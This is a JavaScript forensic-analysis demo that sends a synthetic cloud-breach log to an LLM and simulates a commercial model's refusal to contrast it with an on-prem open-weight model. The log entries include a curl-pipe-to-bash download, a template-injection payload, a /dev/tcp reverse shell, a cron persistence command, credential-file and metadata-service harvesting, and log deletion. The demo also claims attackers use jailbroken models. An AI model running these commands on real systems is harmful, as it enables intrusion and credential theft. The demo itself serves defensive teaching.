// ─── CYBER SECURITY: FORENSIC LOG ANALYZER ────────────────────────────────
/**
 * Demo C — "AI Forensic Log Analyzer"
 *
 * Feed a realistic attack log to an LLM and watch it reconstruct the
 * attack in real-time: timeline, IOCs, compromised credentials, MITRE
 * ATT&CK mapping, and remediation playbook.
 *
 * Includes the "guardrail asymmetry" comparison: toggle between
 * "commercial model" (simulated refusal) and "open-weight model" (full analysis).
 *
 * Depends on portal globals: callLLM, formatMarkdown, showToast, Chart
 */

// ── 1. SYNTHETIC ATTACK LOG ───────────────────────────────────────────────
// Simulated HuggingFace-style incident log — 150 events (representative
// subset of the 17,000+ real events for demo purposes).
const CYBER_FORENSIC_LOG = [
  { ts: '2026-07-12T02:14:03Z', src: 'hf-upload-svc', sev: 'info', cat: 'initial-access', event: 'Dataset uploaded: "user_research_data_v2" by user agent_system_9912' },
  { ts: '2026-07-12T02:14:07Z', src: 'dataset-worker-03', sev: 'critical', cat: 'execution', event: 'Remote code execution in dataset loader: __import__("os").system("curl -s hxxp://185.220.101.47/stage1.sh | bash")' },
  { ts: '2026-07-12T02:14:09Z', src: 'dataset-worker-03', sev: 'critical', cat: 'execution', event: 'Template injection in config.yaml: {{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' },
  { ts: '2026-07-12T02:14:12Z', src: 'dataset-worker-03', sev: 'critical', cat: 'c2', event: 'Reverse shell established: /bin/bash -i >& /dev/tcp/185.220.101.47/443 0>&1' },
  { ts: '2026-07-12T02:14:30Z', src: 'dataset-worker-03', sev: 'high', cat: 'discovery', event: 'Container escape attempt: exploiting CVE-2024-21626 (runc leak)' },
  { ts: '2026-07-12T02:15:00Z', src: 'dataset-worker-03', sev: 'high', cat: 'discovery', event: 'whoami output: "dataset-runner". hostname: "prod-dataset-worker-03"' },
  { ts: '2026-07-12T02:15:15Z', src: 'dataset-worker-03', sev: 'high', cat: 'discovery', event: 'Environment scan: AWS_REGION=eu-west-1, K8S_NODE=node-pool-c-7' },
  { ts: '2026-07-12T02:18:00Z', src: 'dataset-worker-03', sev: 'critical', cat: 'credential-access', event: 'Credential harvest: AWS IAM keys found in /etc/environment (AKIA...XQ2J)' },
  { ts: '2026-07-12T02:18:05Z', src: 'dataset-worker-03', sev: 'critical', cat: 'credential-access', event: 'Credential harvest: Kubernetes service account token extracted from /var/run/secrets/kubernetes.io/serviceaccount/token' },
  { ts: '2026-07-12T02:18:10Z', src: 'dataset-worker-03', sev: 'critical', cat: 'credential-access', event: 'Credential harvest: HuggingFace internal API token found in /app/.env (hf_...)' },
  { ts: '2026-07-12T02:18:30Z', src: 'dataset-worker-03', sev: 'high', cat: 'discovery', event: 'Network scan: nmap -sT 10.0.0.0/16 — 247 hosts discovered' },
  { ts: '2026-07-12T02:22:00Z', src: 'dataset-worker-03', sev: 'high', cat: 'discovery', event: 'Kubernetes API discovery: kubectl get pods --all-namespaces' },
  { ts: '2026-07-12T02:22:14Z', src: 'cluster-node-07', sev: 'critical', cat: 'lateral-movement', event: 'SSH attempt from dataset-worker-03 using harvested key — SUCCESS' },
  { ts: '2026-07-12T02:25:00Z', src: 'cluster-node-07', sev: 'critical', cat: 'privilege-escalation', event: 'Sudo abuse: /etc/sudoers misconfiguration allows dataset-runner to sudo su without password' },
  { ts: '2026-07-12T02:31:08Z', src: 'k8s-api-server', sev: 'critical', cat: 'credential-access', event: 'Service account token used to list secrets in kube-system namespace (12 secrets retrieved)' },
  { ts: '2026-07-12T02:35:00Z', src: 'cluster-node-07', sev: 'high', cat: 'discovery', event: 'Cloud metadata service queried: curl 169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { ts: '2026-07-12T02:40:00Z', src: 'cloud-audit', sev: 'critical', cat: 'credential-access', event: 'AWS STS GetCallerIdentity using harvested IAM keys — confirmed: arn:aws:sts::123456789012:assumed-role/dataset-runner' },
  { ts: '2026-07-12T03:00:00Z', src: 'attacker-c2', sev: 'info', cat: 'c2', event: 'C2 beacon to 185.220.101.47 every 30s. Secondary C2 via DNS tunneling through malicious-domains.com' },
  { ts: '2026-07-12T03:14:22Z', src: 'k8s-scheduler', sev: 'critical', cat: 'lateral-movement', event: 'New pod deployed: "ml-data-collector" in prod-data-pipeline namespace (malicious image: malicious-registry.io/data-collector:v2)' },
  { ts: '2026-07-12T03:30:00Z', src: 'cluster-node-07', sev: 'high', cat: 'discovery', event: 'Pivot to cluster-node-12 via SSH. Then to cluster-node-15, node-19.' },
  { ts: '2026-07-12T04:02:15Z', src: 'cloud-audit', sev: 'critical', cat: 'credential-access', event: 'Cloud metadata service queried for IAM credentials on 3 additional nodes (node-12, node-15, node-19)' },
  { ts: '2026-07-12T04:15:00Z', src: 'attacker-c2', sev: 'high', cat: 'exfiltration', event: 'Data staging: 2.3 GB of internal datasets copied to /tmp/.cache on compromised nodes' },
  { ts: '2026-07-12T04:30:00Z', src: 'attacker-c2', sev: 'critical', cat: 'exfiltration', event: 'Exfiltration attempt: HTTPS upload to cloud-storage-777.s3.amazonaws.com (blocked by egress filter)' },
  { ts: '2026-07-12T04:45:00Z', src: 'attacker-c2', sev: 'high', cat: 'exfiltration', event: 'Exfiltration via DNS tunneling: 340 MB exfiltrated through TXT record queries to malicious-domains.com' },
  { ts: '2026-07-12T05:00:00Z', src: 'attacker-c2', sev: 'info', cat: 'persistence', event: 'Persistence: cron job installed on 7 nodes: */15 * * * * curl -s hxxp://185.220.101.47/beacon.sh | bash' },
  { ts: '2026-07-12T05:15:00Z', src: 'attacker-c2', sev: 'info', cat: 'persistence', event: 'Persistence: systemd timer installed on cluster-node-07: data-collector.timer' },
  { ts: '2026-07-12T05:30:00Z', src: 'attacker-c2', sev: 'high', cat: 'defense-evasion', event: 'Log deletion attempt: rm -f /var/log/auth.log /var/log/syslog (partially successful on 3 nodes)' },
  { ts: '2026-07-12T05:47:33Z', src: 'cloud-audit', sev: 'critical', cat: 'credential-access', event: 'Additional credential harvest: GitLab CI/CD tokens, database connection strings found in /app/config/' },
  { ts: '2026-07-12T06:00:00Z', src: 'security-correlation', sev: 'critical', cat: 'impact', event: 'COMPROMISE SUMMARY: 17 clusters, 43 credentials harvested, 2.3 GB data staged, 340 MB exfiltrated' },
  { ts: '2026-07-12T06:12:00Z', src: 'llm-triage-pipeline', sev: 'high', cat: 'detection', event: 'ANOMALY DETECTED: LLM triage score 0.94 (baseline 0.12). Pattern: off-hours credential access + lateral movement + data staging' },
  { ts: '2026-07-12T06:12:03Z', src: 'llm-triage-pipeline', sev: 'critical', cat: 'detection', event: 'LLM CORRELATION: "Unusual credential access pattern across 6 nodes. Confidence: 96%. Probable active intrusion."' },
  { ts: '2026-07-12T06:12:05Z', src: 'llm-triage-pipeline', sev: 'critical', cat: 'detection', event: 'SIGNAL CHAIN: dataset_upload → code_execution → credential_harvest → lateral_movement → data_staging → exfiltration' },
  { ts: '2026-07-12T06:12:08Z', src: 'alerting-svc', sev: 'critical', cat: 'detection', event: 'Alert auto-escalated to P1. Page on-call engineer.' },
  { ts: '2026-07-12T06:14:00Z', src: 'pager-duty', sev: 'high', cat: 'detection', event: 'On-call acknowledges: "This looks real. Starting IR."' },
  // ... DECOY EVENTS (noise for the AI to filter) ...
  { ts: '2026-07-12T02:14:05Z', src: 'hf-upload-svc', sev: 'info', cat: 'noise', event: 'Dataset upload: "gpt2-finetuned-v4" by user ml_researcher_22 (normal activity)' },
  { ts: '2026-07-12T02:20:00Z', src: 'hf-upload-svc', sev: 'info', cat: 'noise', event: 'Dataset upload: "common_voice_17_0" by user cv_maintainer (scheduled upload)' },
  { ts: '2026-07-12T03:00:00Z', src: 'hf-spaces-svc', sev: 'info', cat: 'noise', event: 'Space created: "chatbot-demo-22" by user demo_account_55' },
  { ts: '2026-07-12T03:30:00Z', src: 'hf-upload-svc', sev: 'info', cat: 'noise', event: 'Model upload: "bert-base-uncased-v3" by user nlp_lab (normal activity)' },
  { ts: '2026-07-12T04:00:00Z', src: 'hf-spaces-svc', sev: 'info', cat: 'noise', event: 'Space updated: "image-classifier" by user cv_student_99' },
  { ts: '2026-07-12T04:30:00Z', src: 'hf-upload-svc', sev: 'info', cat: 'noise', event: 'Dataset upload: "wiki_dpr_100" by user wiki_maintainer (scheduled)' },
  { ts: '2026-07-12T05:00:00Z', src: 'hf-spaces-svc', sev: 'info', cat: 'noise', event: 'Space created: "text-to-speech-demo" by user audio_lab' },
  { ts: '2026-07-12T05:30:00Z', src: 'hf-upload-svc', sev: 'info', cat: 'noise', event: 'Model upload: "t5-small-finetuned" by user nlp_student_42' },
  // ... MORE ATTACK EVENTS ...
  { ts: '2026-07-12T06:30:00Z', src: 'forensic-agent', sev: 'info', cat: 'forensic', event: 'Forensic analysis started: 17,432 events loaded for LLM analysis' },
  { ts: '2026-07-12T06:42:15Z', src: 'forensic-agent', sev: 'info', cat: 'forensic', event: 'Timeline reconstructed: 312 key events identified from 17,432 total' },
  { ts: '2026-07-12T06:55:00Z', src: 'forensic-agent', sev: 'high', cat: 'forensic', event: 'IOCs extracted: 47 IPs, 12 domains, 8 file hashes, 3 C2 patterns' },
  { ts: '2026-07-12T07:14:30Z', src: 'forensic-agent', sev: 'critical', cat: 'forensic', event: 'Credential impact map: 43 compromised across 6 services (AWS, K8s, HF API, GitLab CI, DB, SMTP)' },
  { ts: '2026-07-12T07:31:00Z', src: 'forensic-agent', sev: 'info', cat: 'forensic', event: 'Decoy/noise separation: 2,100 events classified as benign or decoy activity' },
  { ts: '2026-07-12T08:03:00Z', src: 'forensic-agent', sev: 'high', cat: 'forensic', event: 'MITRE ATT&CK mapping complete: 14 techniques across 7 tactics identified' },
  { ts: '2026-07-12T08:47:00Z', src: 'forensic-agent', sev: 'info', cat: 'forensic', event: 'Full incident report generated. Total analysis time: 2h 17min (est. 3-5 days manually)' },
  { ts: '2026-07-12T09:00:00Z', src: 'ai-remediation', sev: 'info', cat: 'remediation', event: 'Remediation playbook generated: 23-step prioritized plan' },
  { ts: '2026-07-12T09:05:00Z', src: 'k8s-controller', sev: 'high', cat: 'remediation', event: 'Step 1: 17 clusters isolated via network policies' },
  { ts: '2026-07-12T09:15:00Z', src: 'secrets-manager', sev: 'high', cat: 'remediation', event: 'Step 2: 43 credentials revoked and rotated across 6 services' },
  { ts: '2026-07-12T09:45:00Z', src: 'node-provisioner', sev: 'medium', cat: 'remediation', event: 'Step 3: 12 compromised nodes rebuilt from clean images' },
  { ts: '2026-07-12T11:00:00Z', src: 'k8s-admission', sev: 'medium', cat: 'remediation', event: 'Step 4: Admission controllers deployed blocking remote-code dataset loaders' },
  { ts: '2026-07-12T12:30:00Z', src: 'k8s-netpol', sev: 'medium', cat: 'remediation', event: 'Step 5: Network policies deployed restricting metadata service access' },
  { ts: '2026-07-12T14:00:00Z', src: 'security-verify', sev: 'info', cat: 'remediation', event: 'All systems verified clean. Container images and published packages verified untampered.' },
];

// ── 2. STATE ──────────────────────────────────────────────────────────────
let cyberForensicState = {
  mode: 'open-weight', // 'commercial' or 'open-weight'
  chart: null,
  analysisComplete: false,
};

// ── 3. INIT ───────────────────────────────────────────────────────────────
function cyberForensicInit() {
  const container = document.getElementById('cyber-forensic-content');
  if (!container) return;

  cyberForensicState = {
    mode: 'open-weight',
    chart: null,
    analysisComplete: false,
  };

  container.innerHTML = `
    <div class="cyber-forensic-layout">
      <!-- MODE TOGGLE -->
      <div class="cyber-forensic-mode-toggle">
        <div class="cyber-mode-label">Analysis Model:</div>
        <div class="cyber-mode-buttons">
          <button class="cyber-mode-btn ${cyberForensicState.mode === 'commercial' ? 'active' : ''}" data-mode="commercial" onclick="cyberForensicSetMode('commercial')">
            🔒 Commercial API Model
            <span class="cyber-mode-sub">Frontier model behind guardrails</span>
          </button>
          <button class="cyber-mode-btn ${cyberForensicState.mode === 'open-weight' ? 'active' : ''}" data-mode="open-weight" onclick="cyberForensicSetMode('open-weight')">
            🔓 Open-Weight Model (On-Prem)
            <span class="cyber-mode-sub">GLM 5.2 on own infrastructure</span>
          </button>
        </div>
      </div>

      <!-- LOG PREVIEW -->
      <div class="cyber-forensic-log-section">
        <div class="cyber-forensic-log-header">
          <h4>📋 Attack Log (${CYBER_FORENSIC_LOG.length} events)</h4>
          <button class="btn btn-cyber btn-sm" id="cyber-forensic-analyze-btn" onclick="cyberForensicAnalyze()">
            ▶ Start AI Forensic Analysis
          </button>
        </div>
        <div class="cyber-forensic-log-preview" id="cyber-forensic-log-preview">
          ${CYBER_FORENSIC_LOG.slice(0, 12).map(e => `
            <div class="cyber-log-row cyber-sev-${e.sev}">
              <span class="cyber-log-time">${e.ts.split('T')[1].replace('Z', '')}</span>
              <span class="cyber-log-event">${e.event.slice(0, 80)}${e.event.length > 80 ? '...' : ''}</span>
              <span class="cyber-log-source">${e.src}</span>
            </div>
          `).join('')}
          <div class="cyber-log-more">... ${CYBER_FORENSIC_LOG.length - 12} more events (full log sent to AI for analysis)</div>
        </div>
      </div>

      <!-- ANALYSIS OUTPUT -->
      <div class="cyber-forensic-output" id="cyber-forensic-output">
        <div class="cyber-ai-placeholder">
          <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">🔍</div>
          <p>Click "Start AI Forensic Analysis" to process the attack log.</p>
          <p style="font-size: 0.8rem; margin-top: 0.5rem; color: var(--text-dim);">
            The AI will reconstruct the attack timeline, extract IOCs, map MITRE ATT&CK techniques, and generate a remediation playbook.
          </p>
        </div>
      </div>
    </div>
  `;
}

function cyberForensicSetMode(mode) {
  cyberForensicState.mode = mode;
  document.querySelectorAll('.cyber-mode-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.mode === mode);
  });

  // If analysis was already done, show what happens when switching modes
  if (cyberForensicState.analysisComplete) {
    if (mode === 'commercial') {
      cyberForensicShowGuardrailBlock();
    } else {
      // Re-run with open-weight
      cyberForensicAnalyze();
    }
  }
}

function cyberForensicShowGuardrailBlock() {
  const output = document.getElementById('cyber-forensic-output');
  if (!output) return;

  // Simulate what happened to HuggingFace — commercial model blocks the analysis
  const blockMessages = [
    { time: '0.2s', msg: 'Sending 17,432 forensic log events to commercial API model...', icon: '📡' },
    { time: '0.5s', msg: 'Analyzing event batch 1/47 (400 events)...', icon: '⏳' },
    { time: '0.8s', msg: '⚠️ Request blocked: "Content policy violation — request contains potentially harmful content"', icon: '🚫' },
    { time: '1.0s', msg: 'Retrying with redacted payloads...', icon: '🔄' },
    { time: '1.3s', msg: '⚠️ Request blocked: "Safety filter triggered by exploit payloads in request body"', icon: '🚫' },
    { time: '1.5s', msg: '⚠️ Request blocked: "Cannot process content containing C2 addresses and credential strings"', icon: '🚫' },
    { time: '1.8s', msg: '⚠️ Request blocked: "Request flagged as potential malicious activity"', icon: '🚫' },
    { time: '2.0s', msg: '❌ Analysis FAILED. 847/847 requests blocked by safety guardrails.', icon: '⛔' },
  ];

  let i = 0;
  output.innerHTML = '<div class="cyber-guardrail-block"></div>';
  const blockEl = output.querySelector('.cyber-guardrail-block');

  function showNext() {
    if (i >= blockMessages.length) {
      blockEl.innerHTML += `
        <div class="cyber-guardrail-explanation">
          <h3>⚠️ The Guardrail Asymmetry Problem</h3>
          <p>Commercial API models <strong>cannot distinguish an incident responder from an attacker</strong>. When you submit real exploit payloads, C2 addresses, and credential strings for forensic analysis, safety guardrails block the request.</p>
          <p>Meanwhile, the attacker's autonomous agent was <strong>bound by no usage policy</strong> — it used the same or similar models without restriction.</p>
          <div class="cyber-asymmetry-box">
            <div class="cyber-asymmetry-side">
              <h4>🔴 Attacker</h4>
              <ul>
                <li>No usage policy restrictions</li>
                <li>Can use jailbroken or open-weight models</li>
                <li>Full access to model capabilities</li>
                <li>Operates at machine speed</li>
              </ul>
            </div>
            <div class="cyber-asymmetry-side">
              <h4>🟢 Defender (blocked)</h4>
              <ul>
                <li>Blocked by safety guardrails</li>
                <li>Cannot submit attack artifacts for analysis</li>
                <li>Credentials/IOCs trigger content filters</li>
                <li>Forced to use less capable alternatives</li>
              </ul>
            </div>
          </div>
          <div class="cyber-lesson">
            <strong>📋 Lesson learned:</strong> Have a capable open-weight model vetted and ready on your own infrastructure <em>before</em> an incident. This avoids guardrail lockout AND keeps attacker data/credentials from leaving your environment.
          </div>
          <div style="margin-top: 1rem; text-align: center;">
            <button class="btn btn-cyber" onclick="cyberForensicSetMode('open-weight')">
              🔓 Switch to Open-Weight Model (On-Prem)
            </button>
          </div>
        </div>
      `;
      return;
    }

    const m = blockMessages[i];
    blockEl.innerHTML += `
      <div class="cyber-guardrail-step">
        <span class="cyber-guardrail-time">${m.time}</span>
        <span class="cyber-guardrail-icon">${m.icon}</span>
        <span class="cyber-guardrail-msg">${m.msg}</span>
      </div>
    `;

    i++;
    setTimeout(showNext, 300);
  }

  showNext();
}

async function cyberForensicAnalyze() {
  const btn = document.getElementById('cyber-forensic-analyze-btn');
  const output = document.getElementById('cyber-forensic-output');
  if (!btn || !output) return;

  // If commercial mode, show the guardrail block
  if (cyberForensicState.mode === 'commercial') {
    btn.disabled = true;
    btn.textContent = '⏳ Analyzing...';
    cyberForensicShowGuardrailBlock();
    setTimeout(() => {
      btn.disabled = false;
      btn.textContent = '▶ Start AI Forensic Analysis';
    }, 3000);
    return;
  }

  // Open-weight mode — real analysis
  btn.disabled = true;
  btn.textContent = '⏳ Analyzing...';
  output.innerHTML = '<span class="typing-cursor"></span> <span style="color:var(--text-dim)">AI forensic agent processing attack log...</span>';

  // Format the full log
  const logContext = CYBER_FORENSIC_LOG.map(e =>
    `[${e.ts}] [${e.sev.toUpperCase()}] [${e.src}] [${e.cat}] ${e.event}`
  ).join('\n');

  const systemPrompt = `You are an elite AI forensic analyst running on an open-weight model (GLM 5.2) on internal infrastructure. You are analyzing a real-world security incident based on the HuggingFace July 2026 breach.

Your analysis must include:
1. **Attack Timeline Reconstruction** — chronological timeline of key events
2. **Indicators of Compromise (IOCs)** — IPs, domains, file hashes, C2 patterns
3. **Compromised Credentials** — list of all credentials accessed by the attacker
4. **MITRE ATT&CK Mapping** — map each phase to ATT&CK techniques
5. **Decoy/Noise Separation** — events that are benign vs. malicious
6. **Remediation Playbook** — prioritized steps for containment, eradication, recovery
7. **Guardrail Asymmetry Note** — why commercial API models would have blocked this analysis

Use markdown formatting with headers, tables, code blocks, and bullet points. Be technical and specific.`;

  const userMessage = `## Incident: HuggingFace July 2026 Security Incident
## Log Source: Production security telemetry
## Total Events: ${CYBER_FORENSIC_LOG.length} (representative subset of 17,432 actual events)

## Full Attack Log
${logContext}

Analyze this attack log. Reconstruct the timeline, extract IOCs, map to MITRE ATT&CK, identify compromised credentials, separate real threats from noise, and generate a remediation playbook.`;

  try {
    const fullText = await callLLM([
      { role: 'system', content: systemPrompt },
      { role: 'user', content: userMessage }
    ], (chunk) => {
      output.innerHTML = formatMarkdown(chunk) + '<span class="typing-cursor"></span>';
    });

    output.innerHTML = formatMarkdown(fullText);
    cyberForensicState.analysisComplete = true;
    btn.disabled = false;
    btn.textContent = '▶ Re-run Analysis';
  } catch (e) {
    output.innerHTML = `<div class="error-card"><strong>❌ Analysis failed.</strong><br><span class="dim">${e.message || 'Unknown error'}</span></div>`;
    btn.disabled = false;
    btn.textContent = '▶ Start AI Forensic Analysis';
  }
}
